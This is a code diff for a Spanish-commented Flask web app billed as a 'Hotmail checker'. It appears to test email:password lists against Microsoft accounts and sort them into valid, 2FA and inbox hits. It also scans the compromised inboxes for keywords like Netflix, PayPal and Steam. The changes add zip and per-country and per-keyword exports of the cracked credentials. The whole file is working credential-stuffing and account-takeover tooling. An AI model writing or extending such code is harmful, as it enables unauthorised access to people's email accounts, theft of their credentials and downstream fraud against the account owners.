@@ -8,11 +8,14 @@ import requests
 import urllib3
 import uuid
 import json
+import zipfile
+import io
+import shutil
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
-from flask import Flask, render_template, request, jsonify, send_file
+from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
 from flask_cors import CORS
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -62,12 +65,14 @@ checker_state = {
         'total': 0
     },
     'results': {
-        'valid': [],
-        'inbox': [],
-        '2fa': [],
-        'bad': [],
+        'valid': [],      # email:pass | País
+        'inbox': [],      # email:pass | País | total | [keyword1: count1 | keyword2: count2]
+        '2fa': [],        # email:pass
+        'bad': [],        # No se exporta
         'errors': []
     },
+    'countries': {},      # { 'US': ['email:pass', ...], 'GB': ['email:pass', ...] }
+    'keywords': {},       # { 'Netflix': ['email:pass | País | count', ...], 'Steam': [...] }
     'logs': [],
     'start_time': None,
     'session_folder': None
@@ -171,6 +176,11 @@ def save_country_result(country, email, password):
     path = os.path.join(folder, f"{country}.txt")
     with open(path, 'a', encoding='utf-8') as f:
         f.write(f"{email}:{password}\n")
+    
+    # Guardar en memoria para export
+    if country not in checker_state['countries']:
+        checker_state['countries'][country] = []
+    checker_state['countries'][country].append(f"{email}:{password}")
 
 def save_keyword_result(keyword, content):
     safe_name = re.sub(r'[<>:"/\\|?*]', '_', keyword.strip()) or 'keyword'
@@ -178,6 +188,11 @@ def save_keyword_result(keyword, content):
     path = os.path.join(folder, f"{safe_name}.txt")
     with open(path, 'a', encoding='utf-8') as f:
         f.write(content + '\n')
+    
+    # Guardar en memoria para export
+    if keyword not in checker_state['keywords']:
+        checker_state['keywords'][keyword] = []
+    checker_state['keywords'][keyword].append(content)
 
 def create_optimized_session():
     session = requests.Session()
@@ -213,7 +228,7 @@ def update_stats():
             stats['cpm'] = int(stats['checked'] / elapsed * 60)
 
 # ============================================
-# CLASE MICROSOFT INBOX CHECKER
+# CLASE MICROSOFT INBOX CHECKER (COMPLETA)
 # ============================================
 class MicrosoftInboxChecker:
     def __init__(self, email, password, proxy=None, inbox_keywords=None):
@@ -616,9 +631,10 @@ def check_account(email, password, keywords, proxies):
                 save_string = f"{email}:{password} | {country} | {total_count} Email Found | [{hits_str}]"
                 save_result('Inbox.txt', save_string)
                 
-                inbox_entry = f"{email}:{password} | {country} | {total_count} emails | {', '.join(inbox_hits)}"
-                checker_state['results']['inbox'].append(inbox_entry)
+                # Guardar en resultados para export
+                checker_state['results']['inbox'].append(save_string)
                 
+                # Guardar por keyword
                 for hit in inbox_hits:
                     if ': ' in hit:
                         kw, count = hit.rsplit(': ', 1)
@@ -631,6 +647,7 @@ def check_account(email, password, keywords, proxies):
                 add_log(f"📬 {email} - INBOX HITS: {total_count} emails ({country}) | {hits_str}", 'success')
                 
             else:
+                # Guardar en válidos (sin inbox)
                 checker_state['results']['valid'].append(f"{email}:{password} | {country}")
                 add_log(f"✅ {email} - VALID ({country})", 'success')
             
@@ -644,6 +661,7 @@ def check_account(email, password, keywords, proxies):
         else:
             with threading.Lock():
                 checker_state['stats']['bad'] += 1
+            # NO se guardan en ningún archivo de export
             checker_state['results']['bad'].append(f"{email}:{password}")
             add_log(f"❌ {email} - INVALID", 'error')
     
@@ -682,6 +700,7 @@ def start_checking():
     if not keywords:
         keywords = ["Steam", "Netflix", "PayPal", "Amazon", "Security Alert"]
     
+    # Resetear estado
     checker_state['running'] = True
     checker_state['stats'] = {
         'checked': 0, 'valid': 0, 'inbox': 0, 'custom': 0,
@@ -689,6 +708,8 @@ def start_checking():
         'total': len(accounts)
     }
     checker_state['results'] = {'valid': [], 'inbox': [], '2fa': [], 'bad': [], 'errors': []}
+    checker_state['countries'] = {}
+    checker_state['keywords'] = {}
     checker_state['logs'] = []
     checker_state['start_time'] = time.time()
     checker_state['session_folder'] = None
@@ -701,6 +722,7 @@ def start_checking():
     add_log(f"⚙️ Hilos: {threads}", 'info')
     add_log(f"📁 Session folder: {get_session_folder()}", 'info')
     
+    # Ejecutar en hilo separado
     thread = threading.Thread(target=run_checker, args=(accounts, keywords, proxies, threads))
     thread.daemon = True
     thread.start()
@@ -748,89 +770,131 @@ def get_status():
         'running': checker_state['running'],
         'stats': checker_state['stats'],
         'logs': checker_state['logs'][:30],
-        'results': checker_state['results'],
+        'results': {
+            'valid': checker_state['results']['valid'],
+            'inbox': checker_state['results']['inbox'],
+            '2fa': checker_state['results']['2fa']
+        },
         'session_folder': get_session_folder()
     })
 
-@app.route('/api/export', methods=['POST'])
-def export_results():
-    """Exporta todos los resultados en un archivo TXT"""
-    lines = []
-    lines.append('=' * 70)
-    lines.append('          HOTMAIL CHECKER - RESULTADOS COMPLETOS')
-    lines.append('=' * 70)
-    lines.append(f'📅 Fecha: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
-    lines.append(f'📁 Sesión: {get_session_folder()}')
-    lines.append('=' * 70)
-    lines.append('')
-    
-    lines.append('📊 ESTADÍSTICAS')
-    lines.append('-' * 50)
-    lines.append(f'Total verificadas: {checker_state["stats"]["checked"]}')
-    lines.append(f'✅ Válidas: {checker_state["stats"]["valid"]}')
-    lines.append(f'📬 Inbox Hits: {checker_state["stats"]["inbox"]}')
-    lines.append(f'🔐 2FA: {checker_state["stats"]["2fa"]}')
-    lines.append(f'❌ Inválidas: {checker_state["stats"]["bad"]}')
-    lines.append(f'⚠️ Errores: {checker_state["stats"]["errors"]}')
-    lines.append('')
-    
-    if checker_state['results']['valid']:
-        lines.append('✅ CUENTAS VÁLIDAS (SIN INBOX)')
-        lines.append('-' * 50)
-        for item in checker_state['results']['valid']:
-            lines.append(item)
-        lines.append('')
-    
-    if checker_state['results']['inbox']:
-        lines.append('📬 CUENTAS CON INBOX HITS')
-        lines.append('-' * 50)
-        for item in checker_state['results']['inbox']:
-            lines.append(item)
-        lines.append('')
-    
-    if checker_state['results']['2fa']:
-        lines.append('🔐 CUENTAS CON 2FA')
-        lines.append('-' * 50)
-        for item in checker_state['results']['2fa']:
-            lines.append(item)
-        lines.append('')
-    
-    if checker_state['results']['bad']:
-        lines.append('❌ CUENTAS INVÁLIDAS')
-        lines.append('-' * 50)
-        for item in checker_state['results']['bad']:
-            lines.append(item)
-        lines.append('')
-    
-    if checker_state['results']['errors']:
-        lines.append('⚠️ ERRORES')
-        lines.append('-' * 50)
-        for item in checker_state['results']['errors']:
-            lines.append(item)
-        lines.append('')
-    
-    if not any([checker_state['results']['valid'], checker_state['results']['inbox'], 
-                checker_state['results']['2fa'], checker_state['results']['bad']]):
-        lines.append('⚠️ No hay resultados disponibles. Ejecuta una verificación primero.')
-    
-    lines.append('')
-    lines.append('=' * 70)
-    lines.append('Fin del reporte')
-    
-    content = '\n'.join(lines)
-    filename = f"resultados_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-    
-    with open(filename, 'w', encoding='utf-8') as f:
-        f.write(content)
-    
-    return send_file(
-        filename, 
-        as_attachment=True, 
-        download_name=filename,
-        mimetype='text/plain'
-    )
+# ============================================
+# MÚLTIPLES MÉTODOS DE EXPORT
+# ============================================
 
-@app.route('/api/config', methods=['GET'])
+@app.route('/api/export/all', methods=['POST'])
+def export_all():
+    """Exporta TODO: Inbox.txt, Valid.txt, 2FA.txt, Countries/, Keywords/"""
+    folder = get_session_folder()
+    
+    # Crear estructura de carpetas en un directorio temporal
+    temp_dir = f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    os.makedirs(temp_dir, exist_ok=True)
+    
+    # Copiar archivos principales
+    for filename in ['Inbox.txt', 'Valid.txt', '2FA.txt']:
+        src = os.path.join(folder, filename)
+        if os.path.exists(src):
+            shutil.copy2(src, os.path.join(temp_dir, filename))
+    
+    # Copiar carpetas Countries y Keywords
+    for subfolder in ['Countries', 'Keywords']:
+        src = os.path.join(folder, subfolder)
+        if os.path.exists(src) and os.listdir(src):
+            dst = os.path.join(temp_dir, subfolder)
+            shutil.copytree(src, dst)
+    
+    # Crear ZIP
+    zip_filename = f"hotmail_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, dirs, files in os.walk(temp_dir):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, temp_dir)
+                zipf.write(file_path, arcname)
+    
+    # Limpiar temp
+    shutil.rmtree(temp_dir)
+    
+    return send_file(zip_filename, as_attachment=True, download_name=zip_filename)
+
+@app.route('/api/export/inbox', methods=['POST'])
+def export_inbox():
+    """Exporta solo Inbox.txt"""
+    folder = get_session_folder()
+    path = os.path.join(folder, 'Inbox.txt')
+    
+    if not os.path.exists(path):
+        return jsonify({'error': 'No inbox results found'}), 404
+    
+    return send_file(path, as_attachment=True, download_name='Inbox.txt')
+
+@app.route('/api/export/valid', methods=['POST'])
+def export_valid():
+    """Exporta solo Valid.txt"""
+    folder = get_session_folder()
+    path = os.path.join(folder, 'Valid.txt')
+    
+    if not os.path.exists(path):
+        return jsonify({'error': 'No valid results found'}), 404
+    
+    return send_file(path, as_attachment=True, download_name='Valid.txt')
+
+@app.route('/api/export/2fa', methods=['POST'])
+def export_2fa():
+    """Exporta solo 2FA.txt"""
+    folder = get_session_folder()
+    path = os.path.join(folder, '2FA.txt')
+    
+    if not os.path.exists(path):
+        return jsonify({'error': 'No 2FA results found'}), 404
+    
+    return send_file(path, as_attachment=True, download_name='2FA.txt')
+
+@app.route('/api/export/country/<country>', methods=['POST'])
+def export_country(country):
+    """Exporta archivo de un país específico"""
+    folder = os.path.join(get_session_folder(), 'Countries')
+    path = os.path.join(folder, f"{country}.txt")
+    
+    if not os.path.exists(path):
+        return jsonify({'error': f'No results for country {country}'}), 404
+    
+    return send_file(path, as_attachment=True, download_name=f"{country}.txt")
+
+@app.route('/api/export/keyword/<keyword>', methods=['POST'])
+def export_keyword(keyword):
+    """Exporta archivo de una keyword específica"""
+    safe_name = re.sub(r'[<>:"/\\|?*]', '_', keyword.strip()) or 'keyword'
+    folder = os.path.join(get_session_folder(), 'Keywords')
+    path = os.path.join(folder, f"{safe_name}.txt")
+    
+    if not os.path.exists(path):
+        return jsonify({'error': f'No results for keyword {keyword}'}), 404
+    
+    return send_file(path, as_attachment=True, download_name=f"{safe_name}.txt")
+
+@app.route('/api/export/countries/list', methods=['GET'])
+def list_countries():
+    """Lista todos los países disponibles para export"""
+    folder = os.path.join(get_session_folder(), 'Countries')
+    if not os.path.exists(folder):
+        return jsonify({'countries': []})
+    
+    countries = [f.replace('.txt', '') for f in os.listdir(folder) if f.endswith('.txt')]
+    return jsonify({'countries': countries})
+
+@app.route('/api/export/keywords/list', methods=['GET'])
+def list_keywords():
+    """Lista todas las keywords disponibles para export"""
+    folder = os.path.join(get_session_folder(), 'Keywords')
+    if not os.path.exists(folder):
+        return jsonify({'keywords': []})
+    
+    keywords = [f.replace('.txt', '') for f in os.listdir(folder) if f.endswith('.txt')]
+    return jsonify({'keywords': keywords})
+
+@app.route('/api/export/config', methods=['GET'])
 def get_config():
     return jsonify(CONFIG)
 
